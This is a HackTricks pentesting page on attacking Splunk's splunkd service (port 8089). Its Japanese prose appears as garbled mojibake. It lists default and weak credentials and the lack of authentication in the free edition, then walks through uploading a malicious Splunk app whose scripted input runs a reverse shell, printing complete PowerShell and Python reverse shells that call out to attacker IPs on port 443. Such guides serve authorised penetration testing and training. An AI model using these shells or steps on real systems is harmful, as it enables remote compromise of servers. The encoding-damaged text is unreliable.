# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **åŸºæœ¬æƒ…å ±**

* ãƒ‡ãƒ¼ã‚¿åé›†ã€åˆ†æã€å¯è¦–åŒ–ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ­ã‚°åˆ†æãƒ„ãƒ¼ãƒ«
* ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£è¦–ã‚„ãƒ“ã‚¸ãƒã‚¹åˆ†æã§ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹
* ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ:
* ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼: 8000
* Splunkdã‚µãƒ¼ãƒ“ã‚¹: 8089

### è„†å¼±æ€§ãƒ™ã‚¯ãƒˆãƒ«:

1. ç„¡æ–™ç‰ˆã®æ‚ªç”¨

* ãƒˆãƒ©ã‚¤ã‚¢ãƒ«ç‰ˆã¯60æ—¥å¾Œã«è‡ªå‹•çš„ã«ç„¡æ–™ç‰ˆã«å¤‰ã‚ã‚‹
* ç„¡æ–™ç‰ˆã¯èªè¨¼ãŒãªã„
* ç®¡ç†ã•ã‚Œãªã„å ´åˆã€æ½œåœ¨çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ãŒã‚ã‚‹
* ç®¡ç†è€…ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å½±éŸ¿ã‚’è¦‹è½ã¨ã™å¯èƒ½æ€§ãŒã‚ã‚‹

2. èªè¨¼æƒ…å ±ã®è„†å¼±æ€§

* å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³: ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®èªè¨¼æƒ…å ± `admin:changeme`
* æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³: ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«æ™‚ã«è¨­å®šã•ã‚ŒãŸèªè¨¼æƒ…å ±
* å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ä½¿ç”¨ã®å¯èƒ½æ€§ (ä¾‹: `admin`, `Welcome`, `Password123`)

3. ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã®æ©Ÿä¼š

* è¤‡æ•°ã®ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œæ–¹æ³•:
* ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®Djangoã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³
* RESTã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ
* ã‚¹ã‚¯ãƒªãƒ—ãƒˆå…¥åŠ›
* ã‚¢ãƒ©ãƒ¼ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆ
* ã‚¯ãƒ­ã‚¹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚µãƒãƒ¼ãƒˆ (Windows/Linux)
* ã‚¹ã‚¯ãƒªãƒ—ãƒˆå…¥åŠ›ã¯ä»¥ä¸‹ã‚’å®Ÿè¡Œã§ãã‚‹:
* Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆ
* PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆ
* ãƒãƒƒãƒã‚¹ã‚¯ãƒªãƒ—ãƒˆ

ä¸»ãªæ‚ªç”¨ã®å¯èƒ½æ€§:

* æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã®ä¿å­˜
* ç„¡æ–™ç‰ˆã®èªè¨¼ã®æ¬ å¦‚
* ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã®ãŸã‚ã®è¤‡æ•°ã®ãƒ™ã‚¯ãƒˆãƒ«
* ã‚·ã‚¹ãƒ†ãƒ ä¾µå®³ã®ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆå…¥åŠ›ã®æ´»ç”¨ã®å¯èƒ½æ€§

### Shodan

* `Splunk build`

## RCE

### ã‚«ã‚¹ã‚¿ãƒ ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ä½œæˆ

Splunkã¯ã€ã‚«ã‚¹ã‚¿ãƒ ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å±•é–‹ã‚’é€šã˜ã¦ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã®ãŸã‚ã®é«˜åº¦ãªæ–¹æ³•ã‚’æä¾›ã—ã€ãã®ã‚¯ãƒ­ã‚¹ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°æ©Ÿèƒ½ã‚’æ´»ç”¨ã—ã¦ã„ã¾ã™ã€‚ä¸»è¦ãªæ‚ªç”¨æŠ€è¡“ã¯ã€WindowsãŠã‚ˆã³Linuxã‚·ã‚¹ãƒ†ãƒ ã§ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å®Ÿè¡Œã§ãã‚‹æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ä½œæˆã™ã‚‹ã“ã¨ã«ã‚ã‚Šã¾ã™ã€‚

ã‚«ã‚¹ã‚¿ãƒ ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯**Pythonã€Batchã€Bashã€ã¾ãŸã¯PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€**Splunkã«ã¯PythonãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ãŸã‚**ã€**Windows**ã‚·ã‚¹ãƒ†ãƒ ã§ã‚‚Pythonã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

[**ã“ã¡ã‚‰**](https://github.com/0xjpuff/reverse_shell_splunk)ã®ä¾‹ã‚’ä½¿ç”¨ã—ã¦ã€[Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py)ã¨[PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1)ã®ä¾‹ã‚’å«ã‚€**`bin`**ã‚’ä½œæˆã§ãã¾ã™ã€‚ã¾ãŸã¯ã€è‡ªåˆ†ã§ä½œæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

æ‚ªç”¨ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ å…¨ä½“ã§ä¸€è²«ã—ãŸæ–¹æ³•è«–ã«å¾“ã„ã¾ã™:
```
splunk_shell/
â”œâ”€â”€ bin        (reverse shell scripts)
â””â”€â”€ default    (inputs.conf configuration)
```
é‡è¦ãªè¨­å®šãƒ•ã‚¡ã‚¤ãƒ« `inputs.conf` ã¯ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ä»¥ä¸‹ã‚’è¡Œã„ã¾ã™ï¼š

* `disabled = 0` ã‚’è¨­å®š
* 10ç§’ã®å®Ÿè¡Œé–“éš”ã‚’è¨­å®š
* ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®ã‚½ãƒ¼ã‚¹ã‚¿ã‚¤ãƒ—ã‚’å®šç¾©

ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆã¯ç°¡å˜ã§ã™ï¼š

1. æ‚ªæ„ã®ã‚ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½œæˆ
2. æ”»æ’ƒãƒã‚·ãƒ³ã§ãƒªã‚¹ãƒŠãƒ¼ï¼ˆNetcat/socatï¼‰ã‚’è¨­å®š
3. Splunkã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’é€šã˜ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰
4. ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ™‚ã«è‡ªå‹•ã‚¹ã‚¯ãƒªãƒ—ãƒˆå®Ÿè¡Œã‚’ãƒˆãƒªã‚¬ãƒ¼

ã‚µãƒ³ãƒ—ãƒ«Windows PowerShellãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ï¼š
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
ã‚µãƒ³ãƒ—ãƒ«Linux Pythonãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒã©ã®ã‚ˆã†ã«æ‚ªç”¨ã•ã‚Œã¦ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã€æŒç¶šæ€§ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã®èª¬æ˜ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
